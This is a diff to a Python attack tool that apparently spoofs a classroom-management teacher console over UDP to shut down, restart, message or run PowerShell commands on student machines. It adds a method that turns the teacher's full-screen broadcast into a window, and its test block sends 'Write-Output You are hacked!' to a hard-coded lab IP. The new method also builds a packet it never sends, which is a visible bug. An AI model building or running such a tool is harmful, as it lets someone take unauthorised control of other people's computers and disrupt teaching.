@@ -4,6 +4,7 @@ import logging
 import os
 import socket
 import sys
+import time
 from dataclasses import dataclass
 from typing import Tuple, List
 
@@ -30,6 +31,7 @@ class Payload:
     RESTART: 重启
     MSG: 教师端消息
     CMD: 执行指令
+    WINDOWED: 全屏广播窗口化
     """
     SHUTDOWN: bytes = bytes()
     RESTART: bytes = bytes()
@@ -141,7 +143,7 @@ class Target:
         except OSError as e:
             logger.error(f"OSError ({type(e).__name__}): {e}")
         else:
-            logger.debug(f"SEND: {len(packet)} -> {address[0]}:{address[1]}")
+            logger.debug(f"SEND: length of {len(packet)} -> {address[0]}:{address[1]}")
 
     def shutdown(self) -> None:
         """
@@ -156,6 +158,22 @@ class Target:
         """
         self._safe_sendto(Payload.RESTART, self.address)
         logger.info(f"RESTART -> {self.address[0]}:{self.address[1]}")
+
+    def windowed(self) -> None:
+        """
+        使全屏广播窗口化。
+        """
+        packet = bytearray(226)
+
+        for i, byte in enumerate(Payload.WINDOWED):
+            if i < len(packet):
+                packet[i] = byte
+
+        packet[216] = 1
+        packet[19] = int(time.time() * 1000) % 256
+
+        self._safe_sendto(Payload.WINDOWED, self.address)
+        logger.info(f"WINDOWED -> {self.address[0]}:{self.address[1]}")
 
     def msg(self, content: str = "") -> None:
         """
@@ -238,3 +256,5 @@ if __name__ == '__main__':
     ADDR = ("10.165.43.52", 4705)  # edit this test ip before
     send = Target(ADDR)
     send.powershell("Write-Output You are hacked!", "-NoExit")
+    send.msg("HELLO")
+    send.windowed()
